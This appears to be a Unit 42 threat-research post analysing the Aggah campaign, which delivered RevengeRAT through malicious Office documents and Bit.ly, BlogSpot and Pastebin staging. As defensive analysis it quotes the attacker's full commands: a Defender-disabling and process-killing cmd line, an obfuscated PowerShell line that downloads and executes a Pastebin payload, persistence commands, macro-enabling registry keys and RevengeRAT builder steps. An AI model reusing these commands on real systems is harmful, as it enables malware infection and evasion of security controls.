{
    "title": "aggah campaign_ bit.ly_ blogspot_ and pastebin used for c2 in large scale campaign",
    "text": "Tools\nPlaybooks\nSpeaking Events\nAbout Us\nAggah Campaign: Bit.ly, BlogSpot, and Pastebin\nUsed for C2 in Large Scale Campaign\n34,925\npeople reacted\n4\n14 min. read\nThis post is also available in: 日本語  (Japanese )\nExecutive Summary\nIn March 2019, Unit 42 began looking into an attack campaign that appeared to be primarily focused on\norganizations within a Middle Eastern country. Further analysis revealed that this activity is likely part of a much\nlarger campaign impacting not only that region but also the United States, and throughout Europe and Asia.\nOur analysis of the delivery document revealed it was built to load a malicious macro‐enabled document from a\nremote server via Template Injection . These macros use BlogSpot posts to obtain a script that uses multiple\nPastebin pastes to download additional scripts, which ultimately result in the final payload being RevengeRAT\nconfigured with a duckdns[.]org domain for C2. During our research, we found several related delivery\ndocuments that followed the same process to ultimately install RevengeRAT hosted on Pastebin, which suggests\nthe actors used these TTPs throughout their attack campaign.\nInitially, we believed this activity to be potentially associated with the Gorgon Group. Our hypothesis was based\non the high level TTPs including the use of RevengeRAT. However, Unit 42 has not yet identified direct overlaps\nwith other high‐fidelity Gorgon Group indicators. Based on this, we are not able to assign this activity to the\nGorgon group with an appropriate level of certainty.\nIn light of that, Unit 42 refers to the activity described in this blog as the Aggah Campaign based on the actor’s\nalias “hagga”, which was used to split data sent to the RevengeRAT C2 server and was the name of one of the\nPastebin accounts used to host the RevengeRAT payloads.\nThe Delivery\nOur research into the Aggah campaign began with a delivery document sent to organizations in a single Middle\nEastern country via an email on March 27, 2019. This email appeared to originate from a large financial institution\nin the same country, although it was likely spoofed. The subject of the email was “Your account is locked.” This\ninitial delivery document was sent to organizations in one Middle Eastern country, specifically to organizations in\nthe education, media/marketing, and government verticals. Four days later on March 31, we saw the same\ndelivery email sent to a financial organization in a second Middle Eastern country. We later discovered that this\ndelivery document was just one of many in a larger campaign sent to organizations in the United States, Europe\nand Asia targeting the same verticals as in the Middle East as well as Technology, Retail, Manufacturing,\nState/Local Government, Hospitality, Medical, Technology, and other Professional business. The related\ndocuments were functionally similar, so we will describe the original sample we analyzed.\nThe email sent on March 27 had a Word document attached with the filename “Activity.doc” (SHA256:\nd7c92a8aa03478155de6813c35e84727ac9d383e27ba751d833e5efba3d77946 ) that attempted to load\na remote OLE document via Template Injection . When “Activity.doc” is opened, it displays the image in Figure 1\nas a lure in an attempt to trick the user into enabling content to allow macros to run. The lure suggests that the\nuser must open the document in the desktop versions of Microsoft Word, as macros do not function in the online\nversion of Word in Office 365.The “Activity.doc” file does not contain a macro, but the OLE document that it\nloads from the remote server does contain a macro.\nFigure 1. Lure image used in Activity.doc to trick user into enabling macros\nActivity.doc Analysis\nThe delivery document uses Template Injection  to load a file hosted on a remote server. Figure 2 shows the\ncontents of the delivery document’s footer that attempts to load a remote OLE document\nfrom hxxps://static.wixstatic[.]com/ugd/05e470_b104c366c1f7423293887062c7354db2.doc\n:\nFigure 2. Footer in Activity.doc showing remote OLE location\nThe remote OLE file loaded in the footer of Activity.doc file is actually an RTF file (SHA256:\n5f762589cdb8955308db4bba140129f172bf2dbc1e979137b6cc7949f7b19e6f ) that loads an\nembedded Excel document with a heavily obfuscated macro that contains a significant amount of ‘junk’ code. The\npurpose of this macro is to decode and execute the following URL via the “Shell” command:\nmshta hxxp://www.bitly[.]com/SmexEaldos3\nThe command above uses the built‐in “mshta” application to download the contents of URL provided, in this case\na shortened URL using the Bit.ly service. During WildFire’s analysis, the shortened bit.ly URL redirected to\nhxxps://bjm9.blogspot[.]com/p/si.html , as seen in the “Location” field of the HTTP response in\nFigure 3.\nFigure 3. Bit.ly shortened link pointing to blog hosted at Blogspot\nAs you can see in the GET request above, the redirect points the browser (“mshta.exe” in this case) to a blog\nhosted on blogspot[.]com. As you can see in Figure 4, this BlogSpot article appears a bit odd but not necessarily\nmalicious.\nFigure 4.\n bjm9.blogspot[.]com screen capture\nBy analyzing the code hosted on the blog, we discovered it actually includes a JavaScript embedded within it that\nperforms several activities. Figure 5 shows the malicious JavaScript hosted at the seemingly innocuous blog.\nFigure 5. Script embedded in bjm9 Blogspot article\nThe malicious script carries out several activities on the compromised system. First, it attempts to hamper\nMicrosoft Defender by removing its signature set. The script also kills the Defender process along with the\nprocesses for several Office applications. All of this is performed using the following command line:\ncmd.exe /c cd “”%ProgramFiles%\\Windows Defender”” & MpCmdRun.exe -\nremovedefinitions -dynamicsignatures & taskkill /f /im winword.exe & taskkill /f\n/im excel.exe & taskkill /f /im MSPUB.exe & taskkill /f /im POWERPNT.EXE &\nforfiles /c “”taskkill /f /im MSASCuiL.exe”” & forfiles /c “”taskkill /f /im\nMpCmdRun.exe”” & exit\nThe script then attempts to disable security mechanisms within Office products, specifically by setting registry key\nvalues to enable macros and to disable ProtectedView. First, the script enables macros within Word, PowerPoint\nand Excel by setting the following registry keys to a value of “1”:\nHKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\VBAWarnings\nHKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\VBAWarnings\nThe script then attempts to disable the ProtectedView security mechanism within Word, PowerPoint and Excel\nby setting the following registry keys to a value of “1”:\nHKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV\nHKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV\nHKCU\\Software\\Microsoft\\Office\\11.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV\nHKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFiles\nInPV\nHKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsI\nnPV\nHKCU\\Software\\Microsoft\\Office\\11.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocatio\nnsInPV\nHKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV\nHKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV\nHKCU\\Software\\Microsoft\\Office\\11.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInP\nV\nHKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV\nHKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV\nHKCU\\Software\\Microsoft\\Office\\12.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV\nHKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFiles\nInPV\nHKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsI\nnPV\nHKCU\\Software\\Microsoft\\Office\\12.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocatio\nnsInPV\nHKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV\nHKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV\nHKCU\\Software\\Microsoft\\Office\\12.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInP\nV\nHKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV\nHKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV\nHKCU\\Software\\Microsoft\\Office\\14.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV\nHKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFiles\nInPV\nHKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsI\nnPV\nHKCU\\Software\\Microsoft\\Office\\14.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocatio\nnsInPV\nHKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV\nHKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV\nHKCU\\Software\\Microsoft\\Office\\14.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInP\nV\nHKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV\nHKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV\nHKCU\\Software\\Microsoft\\Office\\15.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV\nHKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFiles\nInPV\nHKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsI\nnPV\nHKCU\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocatio\nnsInPV\nHKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV\nHKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV\nHKCU\\Software\\Microsoft\\Office\\15.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInP\nV\nHKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\ProtectedView\\DisableInternetFilesInPV\nHKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\ProtectedView\\DisableAttachementsInPV\nHKCU\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\ProtectedView\\DisableUnsafeLocationsInPV\nHKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\ProtectedView\\DisableInternetFiles\nInPV\nHKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\ProtectedView\\DisableAttachementsI\nnPV\nHKCU\\Software\\Microsoft\\Office\\16.0\\PowerPoint\\Security\\ProtectedView\\DisableUnsafeLocatio\nnsInPV\nHKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\\DisableInternetFilesInPV\nHKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\\DisableAttachementsInPV\nHKCU\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\\DisableUnsafeLocationsInP\nV\nThe technique of enabling macros and disabling ProtectedView in Office, including the order in which the registry\nkeys were modified was also described in our blog covering the Gorgon group. Also, the tactic of killing processes\nfor Windows Defender and Microsoft Office applications was also carried out by Gorgon as well. The Gorgon\ngroup also used the bitly URL shortening service in their attacks, but while these are obvious technique overlaps,\nwe still do not have concrete evidence that this attack campaign is associated with Gorgon.\nThe script hosted on Blogspot then carries out three main activities that include:\n1. Downloading a payload from a Pastebin URL\n2. Creating a scheduled task to periodically obtain and run a script from a Pastebin URL\n3. Creating an autorun registry key to obtain and run a script from a Pastebin URL\nObtaining a payload from Pastebin\nThe script hosted at Blogspot obtains a portable executable payload from a Pastebin URL and executes it. The\nscript builds the following command and attempts to run it using the WScript.Shell object:\nmshta.exe vbscript:CreateObject(“”Wscript.Shell””).Run(“”powershell.exe -noexit -\ncommand [Reflection.Assembly]::Load([System.Convert]::FromBase64String((New-\nObject\nNet.WebClient).DownloadString(\\’h\\’+\\’t\\’+\\’t\\’+\\’p\\’+\\’s:\\’+\\’//p\\’+\\’a\\’+\\’s\\’+\n\\’t\\’+\\’e\\’+\\’b\\’+\\’i\\’+\\’n\\’+\\’.\\’+\\’c\\’+\\’o\\’+\\’m\\’+\\’/\\’+\\’r\\’+\\’a\\’+\\’w\\’+\\’/\n\\’+\\’2LDaeHE1\\’))).EntryPoint.Invoke($N,$N)””,0,true)(window.close)\nThe command above results in the downloading of a portable executable hosted on Pastebin at\nhttps://pastebin[.]com/raw/2LDaeHE1 , decoding the base64 downloaded from the URL, and then\nexecuting it. Figure 6 shows the Pastebin page hosting the executable downloaded by the script.\nFigure 6. 2LDaeHE1 Pastebin page\nThe decoded payload has the following attributes:\nSHA256 b9b67c885200f90eaf9c4911b3a7f5e6707bcb51d1b892df1bde110 13a60f6b5\nCompile\nTime2019‐03‐20 19:43:08\nTable 2. Decoded payload from pastebin[.]com/raw/2LDaeHE1\nThis payload was written in VB.NET and named “Nuclear Explosion,” which is a variant of RevengeRAT configured\nto use the domain “ lulla.duckdns[.]org ” for C2, as seen in Figure 7.\nFigure 7.  RevengeRAT configuration\nAccording to its configuration seen in Figure 8, when sending data to the C2 server, it will split the information\nusing the string “ hagga “, which is the same name as the PasteBin account hosting the payload information seen\nin Figure 6 and the basis of the Aggah campaign name.\nFigure 8. Configuration showing the string “hagga” used to split information sent to the C2 server\nCreating a Scheduled Task\nThe script hosted at the Blogspot blog builds another command to create a scheduled task called “eScan Backup”\nthat runs every 100 minutes. The command string generated by the script used to create this scheduled task is:\nschtasks /create /sc MINUTE /mo 100 /tn eScan Backup /tr “”mshta\nvbscript:CreateObject(“”Wscript.Shell””).Run(“”mshta.exe\nhttps://pastebin[.]com/raw/tb5gHu2G””,0,true)(window.close)”” /F ‘\nThe “eScan Backup” task will use the built‐in mshta  application to download a script from a Pastebin URL,\nspecifically at hxxps://pastebin[.]com/raw/tb5gHu2G  that we will continue to refer to as the tb5gHu2G\nscript. We believe the actors chose the name “eScan Backup” to appear related to the eScan antivirus products.\nFigure 9 shows the scheduled task in Windows’ Task Scheduler program.\nFigure 9. Scheduled task created to reach out to Pastebin URL and run the hosted script every 100 minutes\nThe scheduled task downloading and running the tb5gHu2G script is meant for persistence, as it runs the same\ncommand to hamper Windows Defender and kill Office applications. The tb5gHu2G script also attempts to run\nthe same VBScript as the script hosted on the Blogspot blog, of which downloads and executes the payload from\nthe “2LDaeHE1” Pastebin page shown in Figure 6. Figure 10 shows the Pastebin page hosting the tb5gHu2G\nscript.\nFigure 10. tb5gHu2G Pastebin page\nCreating an Autorun Registry Key\nThe script hosted at the Blogspot blog creates an autorun registry key, which appears to be a second persistence\nmechanism to supplement the previously mentioned scheduled task. To create the autorun key, the script\ngenerates the following command that it will attempt to run:\nCreateObject(“Wscript.Shell”).regwrite\n“HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftUpdate”,\n“C:\\Windows\\System32\\mshta.exe\nvbscript:CreateObject(“”Wscript.Shell””).Run(“”mshta.exe%20http://pastebin[.]com/\nraw/YYZq1XR0″”,0,true)(window.close)” , “REG_EXPAND_SZ”\nThis run key will attempt to download the contents hosted at yet another Pastebin URL of\nhttp://pastebin[.]com/raw/YYZq1XR0\nand run the contents as a script using the Wscript.Shell object. Figure 11 shows the Pastebin page displaying the\ncontents of the script.\nFigure 11. YYZq1XR0 Pastebin page\nThe YYZq1XR0 Pastebin paste contains the following script that does very little:\n<script language=”VBScript”>\nself.close\n</script>\nThe fact that the above script does so little suggests that the actor may update this paste with a new script\ncontaining additional functionality when desired. The editing of pastes is possible if the paste was created using a\n“Pro” account. These pastes were created by an account named HAGGA , which appears to be a PRO account that\nwould allow the actor to update the script to run on infected systems. HAGGA  has several additional pastes as\nwell as seen below in Figure 12. These pastes contain additional malicious scripts that are ultimately used to\ncreate a payload.\nFigure 12. Hagga’s Pastebin page\nPart of a Larger Campaign?\nWhile investigating this particular campaign we reviewed the click count available on Bit.ly.  As of April 11, 2019,\nthe Bit.ly link, SmexEaldos3, referenced in the analysis above contained over 1,900 clicks in about 20 countries\nspanning North America, Europe, Asia, and the Middle East. This high volume click‐count indicated to us that we\nwere likely only looking at an extremely small subset of the actual campaign. It is also highly likely that these click\ncounts also include individuals accessing the shortened link during investigations and research efforts; therefore,\nthe number is not an accurate representation of the number of hosts infected.\nFigure 13. bitly SmexEaldos3 page clicks\nDigging in a bit further we took a look at the document properties to see what additional information we may be\nable to use to help identify related activity. The document properties indicate these operators were using an\napparently pirated version of Microsoft Word and used the string ‘ Lulli moti myri ’ as the creator/author of\nthe document. Using this string we searched in our repositories and identified over a dozen Microsoft Office\ndocuments – half of them DOCX and the other half XLS.\nAll of the documents have a time stamp between January and April 2019, and each contained a Bit.ly URL that\nredirects to a Blogspot page.  While all of these documents were of interest to us, we noticed one configured\nwith the same Bit.ly URL as our original file Activity.doc. This file has the following SHA256:\nSHA256 ef837119fc241e8fde85f36f4635a71f6b87aecf39dc979961be914 f48c4ef4c\nTable 3. Similarly configured document to Activity.doc\nDuring our analysis, we identified several Bit.ly URLs and their redirects resulting in the download of\nRevengeRAT. One particular sample contains the C2 domain kronozzz2.duckdns[.]org . This sample has a\nSHA256 of:\nSHA256 c365b15cb567da7e9c04dffa0de1cb2b8104d5fe668c17691d8c683 80bcd6d30\nTable 4. Decoded payload from pastebin[.]com/raw/sgawvit9\nOne of HAGGA’s pastes includes the title ‘kronoz2 back2new’. This domain indicated to us another possible\nrelation to the HAGGA Pastebin account shown in Figure 12. Open source research revealed a similar domain\nkronoz.duckdns[.]org  associated with a RevengeRAT sample with the following hash:\nSHA256 fa5500a45e98e084b489301fd109676a4d8b0d3b39df4d9e2288569 e232a9401\nTable 5. File associated with kronoz.duckdns[.]org\nAll identified samples are available in Appendix A.\nAfter reviewing all of the delivery documents and RevengeRAT payloads we discovered that all but one payload\ncontains the mutex RV_MUTEX-WindowsUpdateSysten32  (note the purposeful misspelling by the attackers of\n“Systen32” for “System32”) with a base64 encoded identifier of SE9URUlTIE5PVk9T  that decodes to HOTEIS\nNOVOS (“NEW HOTELS” in Portuguese). We searched through our available repositories to see just how many\nsamples contained these strings. We found over 50 files beginning as early as September 2018, which are noted\nin Appendix A. Many of these samples contained the same ‘ hagga ’ key; however, we also noted three other\nadditional keys: ‘ oldman ’, ‘steve ’, and ‘roma225 ’. The ‘roma225’ key was discussed in December 2018 in a\npublication titled ‘The Enigmatic “Roma225” Campaign’ by Yoroi . The one sample that was not configured with\nthat mutex and identifer was the sample noted in Table 5.  That sample contains the mutex RV_MUTEX-\ncuiGGjjtnxDpnF  and the Identifier TWlsZWdvbmE=  which decodes to ‘ Milegona ’.\nCorrelating RevengeRAT samples\nRevengeRAT is a commodity Trojan that has many leaked builders freely available in open source, which makes\nattributing the tool’s use to a specific actor or attack campaign difficult. Because of this, we wanted to determine\nif the mutex, identifier and key seen in Aggah related samples were not standard default values for RevengeRAT\nand if they were strong enough to use for pivoting and correlation purposes. To gauge the likelihood of two\nunrelated actors using the same values in the configuration, we used the leaked RevengeRAT builder (v0.3) to\nvisualize the process an actor would have to take to create RevengeRAT samples that shared the same mutex,\nidentifier and key as the payload delivered in the Aggah campaign.\nTo our surprise, we found it was rather unlikely that two unrelated individuals would use the mutex, identifier, and\nkey just by happenstance. We believe this as the actor must manually enter the mutex, identifier, and key into\nspecific fields within the RevengeRAT builder, in which we will highlight in the following explanation of steps\nrequired to build the Trojan.\nTo create the RevengeRAT payload used in this campaign, the actor would use the RevengeRAT server to compile\nan executable configured with the appropriate fields. First, the actor would set the “Socket Key” field to “hagga”\nand press “Start Listening”, as seen in Figure 14.\n Figure 14. RevengeRAT\nBuilder Socket Key Setting\nOnce the server is configured and listening, the actor would click the “Client Builder” button to create the\nRevengeRAT client, as seen in Figure 15.\n Figure 15. RevengeRAT\nClient Builder\nIn the Client Builder, the actor would click the “Network Settings” drop down and enter the domain\n“lulla.duckdns[.]org ” and the TCP port of 2336 before pressing the add button seen in Figure 16.\n Figure 16. RevengeRAT\nNetwork Settings setup\nThe actor would then click the Basic Settings drop down and enter their chosen identifier “HOTEIS NOVOS” into\nthe “Client Identifier” field and would add “‐WindowsUpdateSysten32” in the “Client Mutex” field, as it already\ncontains “RV_MUTEX” by default. Figure 17 shows these values added to the correct fields. What is of interest to\nnote here is that the actor manually added the string “‐WindowsUpdateSysten32” instead of clicking the plus (“+”)\nbutton available next to this field, which would concatenate a hyphen and a random string instead.\n Figure 17. RevengeRAT\nBasic Settings setup\nLastly, to compile the payload the actor has to agree to the Terms of Service and click the “Compile” button, as\nseen in Figure 18.\n Figure 18. RevengeRAT\nReady to compile\nBy pressing the compile button, the RevengeRAT server will create a client executable with a default name of\n“Client.exe” that the actor can save to the system prior to delivering it in their attack. Figure 19 shows the\nRevengeRAT client icon on the desktop.\nFigure 19. RevengeRAT Client Icon\nThe configuration within the compiled “Client.exe” seen in Figures 16 and 17 visually matches the configuration\nof the RevengeRAT downloaded from Pastebin in the Aggah campaign, as seen in Figures 7 and 8. This suggests\nthat the actor(s) involved in this campaign would have followed similar steps to create their payload. The\nsequence of steps carried out to create RevengeRAT payloads that share the same client identifiers and socket\nkeys suggests with a high confidence that a common actor is involved.\nConclusion\nInitially, according to our telemetry it appeared as though this could be a very focused effort to target\norganizations within one Middle Eastern country. However, after further analysis this appears to be just a small\npart of a much larger campaign which also seems to be affecting many regions including but not limited to the\nUnited States, Europe, and Asia. Unfortunately, our current data set does not afford insight into the attackers’\nmotivation other than to compromise a large number of victims.\nWhile a lot of this activity behaviorally appears to be potentially related to the Gorgon Group’s criminal activity, it\nis currently unclear and requires additional analysis to prove. Both Unit 42  and Yoroi  recently released similar\nblogs which also displayed similar tactics but were not assessed with a high level of confidence as related to the\nGorgon Group. Although we are unsure of a connection to the Gorgon Group specifically, we do assess that\nbased on the unique configuration of these RevengeRAT samples that a common operator was likely involved in\nthe activity mentioned in this blog.\nRevengeRAT is a publicly available RAT which is seen in high volume.  It appears as though some users of this\nRAT have moved from following publicly available step‐by‐step guides to become a little more sophisticated in\nhow they are leveraging alternative storage locations for C2 support, such as Pastebin. These technique changes\nmay help the operators by hiding behind legitimate services that are likely not blocked by security devices.\nPalo Alto Networks customers are protected from these operators in the following ways:\nAutoFocus: Customers can currently track this campaign activity using the following tags: Aggah , RevengeRAT\nWildFire and Traps: detects all malware supported in this report as malicious\nPalo Alto Networks has shared our findings, including file samples and indicators of compromise, in this report with our fellow Cyber Threat Alliance members.\nCTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information\non the Cyber Threat Alliance, visit www.cyberthreatalliance.org.\nAppendix A:\nIndicators of Compromise\n \nMalicious Documents and Payloads\n6101f3210638a6068a9d40077f958e8d8a99ffed686a48426784f368e0ac021b\n89d302cfe11c5fdca420d12cc36d58b449f24ee761b822cb8a22497af7e873ba\n248456219c1be39f494301a16cae0a4ed9676be8d1155fa8ba5540d223797e97\n82e64d2233cd8e755fecfefbd976f6143138f9b33e037f24a25b05fe9abd5620\n1eef9ef568703ba6558923ec88cf960ed86086d87488a188709d32827877f528\n9b47e150a9259ae7a6df20f070dc9faf9d5a589347f8db8a9f64c64060cb7606\n679f1d59116af145f4f7c1a4d1cdb66e4402b0da906a491e09071e8eac696a16\nfa5500a45e98e084b489301fd109676a4d8b0d3b39df4d9e2288569e232a9401\n98136bc4323e00f64b63d1035c313bc08fb56af7894ac050b8e9db6961593eef\nc365b15cb567da7e9c04dffa0de1cb2b8104d5fe668c17691d8c68380bcd6d30\nb9b67c885200f90eaf9c4911b3a7f5e6707bcb51d1b892df1bde11013a60f6b5\nec8ff76234aca351169e7cf4973b8b5d603fa165815107482cbd0d803a829e81\naaabc63bd58fa4b8e2cb79630ea5e24c55f29327cae8ca36aae3219b95100669\nc87fb09929159c2dab63d609d7bde992ce979f3545fbe20ddca0a3f263d9603f\nabba33bdc8cf21423202b000771ec10d8ab7248f199d8211e53be03c9905b0ed\na4c1a9d4a6be9290a58b282f6b7dc75ebd4d4e3866df4fdab80eac56274aabf1\n947ddcefbb1170a6fbd1ba341c773444c1833bedecdb4d6684e05b8555765117\n6fe3548e0dc7fb605ee69791b752df0d9f3d8f5db49b2811011ac2a092ab0a28\n6def95b2858c043e261b8f4d440abc1436a9dc551906d86a37c5f3331af8cbfc\neacad199f02e26ccdc7a866c18e585f7ee7e2a80ef0325208ddb22b1d059be2f\nd2a16840541f905f7bcecf64e2d7dc827f314c4b97daf6e4cc4262fd91fdd14c\n61600526307ec08137967b49b230c03ce8a4e1d2f0d58ea2e5d8b2ab3bf92df7\n8e6c25f517a69c5da329f858b291b4d146c3fd0dd07c17a1d8a6851cddb347eb\n7acd5696306ae7ed8de112f096917487df2d01c2aa66b4b9d2a37ea36b597b1a\n2815552fd2f57eba147715331f96387dcb4769d3af816e9db2195e5602fc3a1a\n251e3e25584d1a654a395accbcfdb506ec8b9d7039cb3ab725e14415d3c71aad\nf5e170571689b393139b9cea484a9683305129ecbf2ab4ebb93fc997ee1d31aa\n77a1430cfd728daa7a61e10f3cdc3409104cae1aed65711c8f5ce425c6920cb7\n9c8fa4205b2ed8a6f60156bdc39d33a23c6e503cf2f8e69d66bf2980e78bacef\nc57ff49bfe21e345c2bde30bc8feb60626f3c7839b1c2e5a1f01b9a567f911d8\n8e771cbb12b259d4d12feac34c80e95eb38228dea393d49e0b9cc6f19861847c\nabcce639df67279c73f327b2c511183c00ca96555fe481a4ae417bf752c96efa\n83d9c57cfc40457b072bdc0e062dd5ca4958a91d8cf3387dbedd99af753da640\n5976fca040071eb33ca383412b915e5160133c4e0f8a07bbbaa478ceeee0a890\na5c3c96b655d3115a39875e0303951fef2f2d6119b0af9eaadf57bacfae3f5cb\n10d4bd37cd29071186b4ef31341edb79a9ae05c6bc8d26c9850cfeccabb90d1f\n89903b38efc7a86da63d547d3d4e3439d64656a030cb289eff4721bc5ada3e13\n464f30101630f06013ea65e72b0c043fa1fc83440d9c3367e474d6309d3fe4c9\n5e226f1c0729d1fbcf6e074e28009d35e2f6eaa4d4eb0c411892ea56e1299c86\nf57fff1b8acdee475b161ec1313452f0fe66077142fc677a63f7914a96890bae\na1879f1f3c2bbb1a4cf8af8e54230c3b0b88c29e37902c88d37ec9d7a1138894\n3fa2591b208137d68aa87da931d9cc152a62250b7d26755818f362fa5015a99a\n87f43fd2f6c9d1439ceb250e3bd045a07d9a8c214cf17dc66a8c22a3846b6437\n4e2997adac5ae57ab92512e5b02e9a5ceb588f287a68387420113ed7b3d347d2\nd32f1bd358b97f8f1ae2295c7e8969fab1460d9d54c9528dcfbb42c96a74b31b\nf69fff5106fc73672569abc62ad85cfa461c237d9222426db20d6565021c110f\n5742ebd53b2b495df0c6bff8ddc17d1726cb8e76e269bd8207b07a0a3ee2b813\nd2a2373a386392f72372c9a23b42b43fd2652b6dafce6a6d8d44368ccbfdadb6\nb9f74a648b0202109d2c53d68a8474d6eabfefba28bf99a53517ece52da483d5\n3088fcd46c51e7ace8aee4e9bfb018aa1d0b0a52fbea62e5ef121e4fe637ebfc\n54cba5cfb44379f8a4aac2e1d93d7e8e2ba83afe312d2b1a4f9145846efcd413\n00a002607b6e7938292e7ae81ca60d58a091c456ea4343210d4bb610b6edee01\n4c29279f341f568056fe9e2ff8bfb2fcaf06b065246329ca9652fcd7986b405d\n1d1904dad2df5d677342806cbf1b67b9840d1bc9c85c10928896fcfa91661762\n5f762589cdb8955308db4bba140129f172bf2dbc1e979137b6cc7949f7b19e6f\nb10519bb52656a09aa146305d8b2ec4aa55f3dba43c633d9de23046798a32a2f\nb6db8716bedd23042883f31132fa00b4125c659f2799d239f42105367ff42aec\n821e6f3faacb4edafa8ddb60f83a7c8e87845a07ad8d1f8362a7c68cd8a48343\n1fd98d66d123d4d0c049b4e1053d22335ef9dcec9fdde398d608c7d7d23ed280\n5ca968f9e6a97505abe7c732b5ee573f787b11f294ccbf3a96ae7b77ccce004c\n26f5e813e34c05cd1e553224e5c8284ced7fa648d55725416232c24e58546e60\nef837119fc241e8fde85f36f4635a71f6b87aecf39dc979961be914f48c4ef4c\nd7c92a8aa03478155de6813c35e84727ac9d383e27ba751d833e5efba3d77946\n915535fd77ac89a3a86eca6b3a1f1852f69c141050754f059c094c39a9ee4259\n0671a2b4ae1a94edca9f65f7d11199d6526cab1fd53911e114ab772900d8a583\nea3cab2a0b74e30c0d6812e3ef6fcc9e47ea723c98d39fa1e04d5edf03193ff0\nde657d3538e96a8d2c74b7c4f8c6fb2e51d67f12d158abfea2964298a722993c\n70657b183854550e77633f85d9e63fbf0b01a21131388228985322880b987b9a\nbc8a00fddff73accaff5eb5f3a6ca182a5282502d7af054ca9176d2e98a5116a\nc3f36883ebf928c8403e068648299b53b09fecb0f56986980319e83f13dc296c\n0e5011ee17c5f9bbcad8df4dc2a971fe56346f8ca7ce4e93d25f3b02086c581c\n51147c260c18d3e766006ae4ffa216d4c178c8ee669a83391fab0de98da24b27\ne1eb9daa5fb43b9f07e2b75f931a815fd5adf7e3f8d4f885740202af886402da\n08883b4d7081d51bb9d9429f856c7c4c95f47a22f38aeb48b777263